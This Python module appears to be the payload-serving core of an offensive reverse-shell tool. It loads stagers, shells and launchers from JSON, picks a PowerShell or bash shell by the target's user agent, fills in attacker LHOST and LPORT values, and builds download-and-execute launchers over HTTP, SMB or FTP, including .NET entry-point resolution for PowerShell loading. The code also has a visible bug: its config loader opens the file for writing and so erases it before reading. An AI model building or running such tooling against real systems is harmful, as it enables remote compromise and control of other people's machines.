import json
import logging as logger
import os
import re
from pathlib import Path
from random import choice
from string import ascii_lowercase

import jsonpickle
import user_agents
from colorama import Fore
from watchdog.events import DirModifiedEvent, FileSystemEventHandler
from watchdog.observers import Observer

from .cvars import PLACEHOLDER_L, PLACEHOLDER_R, CvarManager
from .transformers import ITransformer

PLACEHOLDER_SHELL = f"{PLACEHOLDER_L}SHELL{PLACEHOLDER_R}"
PLACEHOLDER_SHELLBIN = f"{PLACEHOLDER_L}SHELLBIN{PLACEHOLDER_R}"

PLACEHOLDER_RNG_REGEX = re.compile(r"<<RNG:[0-9]+:[0-9+]+>>")


class PssObj:
    def __init__(self, payload: str):
        self.payload = payload

    @staticmethod
    def try_get(name: str, source: list):
        if name is not None:
            name = name.lower()
            for x in source:
                if x.name == name:
                    return x
        return None

    @staticmethod
    def try_get_payload(name: str, source: list) -> str | None:
        x = PssObj.try_get(name, source)
        return x.payload if x else None

    def get_cvars(self, cvars: CvarManager):
        return cvars.get_cvars_str(self.payload)

    def fill(self, cvars: CvarManager) -> str:
        return cvars.insert_all(self.payload)


class PssNamedObj(PssObj):
    def __init__(self, name, style, data):
        PssObj.__init__(self, data["payload"])
        self.style = style.lower()
        self.name = f"{self.style}/{name.lower()}"

    @classmethod
    def from_json(cls, json_str: str):
        for style, launchers in json.loads(json_str).items():
            for name, data in launchers.items():
                yield cls(name, style, data)

    def __str__(self) -> str:
        return self.name


class PssShell(PssNamedObj):
    def __init__(self, name, style, data):
        PssNamedObj.__init__(self, name, style, data)

    @staticmethod
    def try_select_shell_by_user_agent(user_agent: str, source):
        try:
            shell = None
            possible_os = user_agents.parse(user_agent).get_os().lower()
            logger.warning(f"OS detected by user-agent: {Fore.LIGHTYELLOW_EX}{possible_os}{Fore.RESET}")

            # try to auto select a shell based on useragent
            if possible_os.startswith("windows"):
                shell = PssObj.try_get("powershell/simple", source)
            elif possible_os.startswith("linux") or possible_os.startswith("other"):
                shell = PssObj.try_get("bash/i_c", source)

            if shell:
                logger.warning(f"Auto-selected shell: {Fore.LIGHTYELLOW_EX}{shell}{Fore.RESET}")
            else:
                logger.warning("No suiteable shell found")

            return shell
        except:
            logger.warning("Failed to auto-select a shell by user-agent")
        return None


class PssLauncher(PssNamedObj):
    def __init__(self, name, style, data):
        PssNamedObj.__init__(self, name, style, data)


class PssStager(PssNamedObj):
    def __init__(self, name, style, data):
        PssNamedObj.__init__(self, name, style, data)


class PayloadManagerConfig:
    def __init__(self):
        self.cvars = CvarManager()
        self.stagers = []
        self.shells = []
        self.launchers = []
        self.transformers = {}
        self.serve_folder = None
        self.accept_uploads = True
        self.uploads_folder = None
        self.uploads_use_serve_folder = False
        self.tmpfolder = None
        self.dump_headers = False


class PayloadManager(FileSystemEventHandler):
    def __new__(cls):
        if not hasattr(cls, "instance"):
            cls.instance = super(PayloadManager, cls).__new__(cls)
            cls.instance.cfg = PayloadManagerConfig()

            cls.instance.serve_files = []
            cls.instance.serve_file_blacklist = [
                "__init__.py",
            ]
            cls.instance.serve_file_folder_blacklist = [
                ".git",
                ".vs",
                "__pycache__",
            ]
            cls.instance.serve_file_ext_whitelist = [
                ".sh",
                ".py",
                ".exe",
                ".dll",
                ".zip",
                ".tar.gz",
                ".tar",
                ".deb",
                ".ps1",
                ".bat",
            ]

            cls.instance.fs_observer = Observer()
            cls.instance.fs_observer.daemon = True
            cls.instance.fs_observer.start()
        return cls.instance

    @property
    def shell_count(self) -> int:
        return len(self.cfg.shells)

    @property
    def shell_names(self) -> list:
        return sorted([s.name for s in self.cfg.shells])

    @property
    def launcher_count(self) -> int:
        return len(self.cfg.launchers)

    @property
    def launcher_names(self) -> list:
        return sorted([l.name for l in self.cfg.launchers])

    @property
    def stager_count(self) -> int:
        return len(self.cfg.stagers)

    @property
    def transformer_count(self) -> int:
        return len(self.cfg.transformers)

    @property
    def cvars(self) -> CvarManager:
        return self.cfg.cvars

    def save_config(self, config_path):
        logger.info(f'Saved config "{Fore.LIGHTYELLOW_EX}{config_path}{Fore.RESET}"')

        try:
            with open(config_path, "w+") as cfg_file:
                cfg_file.write(jsonpickle.encode(self.cfg))
        except Exception as ex:
            logger.warning(f'Failed to save file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}": {ex}')

    def load_config(self, config_path):
        if config_path.exists():
            try:
                with open(config_path, "w+") as cfg_file:
                    self.cfg = jsonpickle.decode(cfg_file.read())

                logger.info(f'Loaded config "{Fore.LIGHTYELLOW_EX}{config_path}{Fore.RESET}"')
            except Exception as ex:
                logger.warning(f'Failed to load file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}": {ex}')
        else:
            logger.warning(f'Config file "{Fore.LIGHTRED_EX}{config_path}{Fore.RESET}" does not exist')

    def update_serve_folder_watchdog(self):
        self.fs_observer.unschedule_all()
        self.fs_observer.schedule(self, self.cfg.serve_folder, recursive=True)
        self.on_any_event(None)

    def on_any_event(self, event):
        if event is None or isinstance(event, DirModifiedEvent):

            def get_serve_files():
                for file in get_all_files(self.cfg.serve_folder):
                    if file.name not in self.serve_file_blacklist and file.suffix.lower() in self.serve_file_ext_whitelist:
                        rel_path = file.relative_to(self.cfg.serve_folder)

                        for folder in rel_path.parents:
                            folder = folder.name.strip()

                            if folder:
                                if folder in self.serve_file_folder_blacklist:
                                    break
                        else:
                            yield str(rel_path)

            self.serve_files = sorted(get_serve_files())

    def transformer_register(self, cls, enabled=False):
        self.cfg.transformers[cls.__name__] = {"transformer": cls(), "enabled": enabled}

    def load_stagers_json(self, stagers_json):
        self.cfg.stagers = list(PssStager.from_json(stagers_json))

    def load_stagers_file(self, stagers_file):
        try_read_json(stagers_file, self.load_stagers_json)

    def load_shells_json(self, shells_json):
        self.cfg.shells = list(PssShell.from_json(shells_json))

    def load_shells_file(self, shells_file):
        try_read_json(shells_file, self.load_shells_json)

    def load_launchers_json(self, launchers_json):
        self.cfg.launchers = list(PssLauncher.from_json(launchers_json))

    def load_launchers_file(self, launchers_file):
        try_read_json(launchers_file, self.load_launchers_json)

    def try_get_shell(self, shell_name) -> PssShell | None:
        return PssShell.try_get(shell_name, self.cfg.shells)

    def try_get_stager(self, stager_name) -> PssStager | None:
        return PssStager.try_get(stager_name, self.cfg.stagers)

    def try_get_launcher(self, launcher_name) -> PssLauncher | None:
        return PssLauncher.try_get(launcher_name, self.cfg.launchers)

    def tranformer_switch(self, transformer, status=None):
        if transformer in self.cfg.transformers:
            if status is None:
                self.cfg.transformers[transformer]["enabled"] = not self.cfg.transformers[transformer]["enabled"]
            else:
                self.cfg.transformers[transformer]["enabled"] = status

            if self.cfg.transformers[transformer]["enabled"]:
                logger.info(f"{transformer} {Fore.LIGHTGREEN_EX}enabled{Fore.RESET}")
            else:
                logger.info(f"{transformer} {Fore.LIGHTRED_EX}disabled{Fore.RESET}")
        else:
            logger.warning(f'Tranformer named "{transformer}" does not exist')

    def build_payload(self, stager: str, user_agent: str = None) -> str | None:
        if stager.startswith("/"):
            stager = "".join(stager[1:])

        stager_content = PssStager.try_get_payload(stager, self.cfg.stagers)

        if stager_content:
            if self.cvars.has_cvar(stager_content, "SHELL"):
                shell = PssObj.try_get(self.cvars.SHELL, self.cfg.shells)

                if not shell and user_agent:
                    shell = PssShell.try_select_shell_by_user_agent(user_agent, self.cfg.shells)

                if shell:
                    shell_payload = shell.fill(self.cvars)
                    stager_content = ITransformer.apply_enabled_to_stager(self.cfg.transformers, PLACEHOLDER_SHELL, stager_content, shell_payload)

            return self.cvars.insert_all(stager_content)
        else:
            s_path = stager.split("/")

            if len(s_path) > 1:
                s_path = s_path[0]
                stager_set = set()

                for stager in self.cfg.stagers:
                    splitted = stager.name.split("/")

                    if splitted[0] == s_path:
                        stager_set.add(splitted[1])

                if len(stager_set) == 0:
                    return None

                stagers = '<a href="..">../</a><br>'

                for stager in sorted(stager_set):
                    stagers += f'<a href="{stager}">{stager}</a><br>'

                return stagers
            else:
                stagers = f'<h3>PSS HTTP Server</h3><p> \
                            -> SHELL: <i>{self.cvars.SHELL}</i><br> \
                            -> SHELLBIN: <i>{self.cvars.SHELLBIN}</i><br> \
                            -> LHOST: <i>{self.cvars.LHOST}</i><br> \
                            -> LPORT: <i>{self.cvars.LPORT}</i></p> \
                            <pre>* To change the shell binary that will be used in the stagers, type <i>"set SHELLBIN /bin/zsh"</i> in the console.<br>  The same method can be used to change LHOST and LPORT.</pre> \
                            <pre>* To change the shell that is supplied here, type <i>"shell set nc/mkfifo"</i> in the console.<br>  Otherwise, pss may choose a shell based on the user agent sent by the browser.</pre>'

                for stager_category in sorted(set([x.name.split("/")[0] for x in self.cfg.stagers])):
                    stagers += f'<a href="{stager_category}/">{stager_category}/</a><br>'

                return stagers

        return None

    def launcher_generate(self, launcher_name: str, suffix: str, smb_share: str):
        launcher = PssLauncher.try_get(launcher_name, self.cfg.launchers)

        if launcher:
            payload = launcher.fill(self.cvars)
            rng_values = set(PLACEHOLDER_RNG_REGEX.findall(payload))

            for rng in rng_values:
                parts = rng.split("<<RNG")[1].split(">>")[0].split(":")
                random_str = "".join([choice(ascii_lowercase) for _ in range(int(parts[2]))])
                payload = re.sub(rng, random_str, payload)

            placeholders = {
                "http": f"http://{self.cvars.LHOST}/{suffix}",
                "smb": f"\\\\{self.cvars.LHOST}\\{smb_share}\\{suffix}",
                "ftp": f"ftp://anonymous@{self.cvars.LHOST}/{suffix}",
            }

            if launcher.style in placeholders:
                payload = re.sub(f"{PLACEHOLDER_L}TAG{PLACEHOLDER_R}", placeholders[launcher.style], payload)

            special_replaces = {
                "FILENAME": lambda s: Path(s).name,
                "FILEPATH": lambda s: s,
                "HTTP": lambda s: f"http://{self.cvars.LHOST}",
                "SMB": lambda s: f"\\\\{self.cvars.LHOST}\\{smb_share}",
                "FTP": lambda s: f"ftp://anonymous@{self.cvars.LHOST}",
                "LHOST": lambda s: self.cvars.LHOST,
                "DOTNETENTRYPOINTPS": lambda s: get_dotnet_entrypoint(Path(self.cfg.serve_folder, s), "ps"),
            }

            try:
                for tag, fn in special_replaces.items():
                    placeholder = f"{PLACEHOLDER_L}{tag}{PLACEHOLDER_R}"
                    if placeholder in payload:
                        payload = re.sub(placeholder, fn(suffix), payload)
            except Exception as e:
                logger.error(f'Failed replace "{tag}": "{e}"')

            return payload
        else:
            logger.warning(f'Launcher named "{launcher_name}" does not exist')

        return None


def try_read_json(file: str, fn):
    if Path(file).exists():
        with open(file) as launchers_file:
            fn(launchers_file.read())
    else:
        logger.error(f'File does not exist: "{file}"')


def get_all_files(path: str | Path):
    if not isinstance(path, Path):
        path = Path(path)

    if path.exists():
        for currentpath, _, files in os.walk(path):
            for file in files:
                yield Path(currentpath, file)


def get_dotnet_entrypoint(assembly_path, class_name="Program", fmt="ps"):
    if assembly_path.exists():
        try:
            import clr

            clr.AddReference("System.Reflection")
            from System.Reflection import Assembly

            entry_point = Assembly.LoadFile(str(assembly_path)).EntryPoint

            if entry_point:
                namespace = entry_point.DeclaringType.Namespace
                class_name = entry_point.DeclaringType.Name
                function_name = entry_point.Name

                if fmt == "ps":
                    return f"[{namespace}.{class_name}]::{function_name}"
        except Exception as e:
            logger.error(f'Failed to get entrypoint: "{assembly_path}"\n{e}\n')
            pass
    return "NONE"
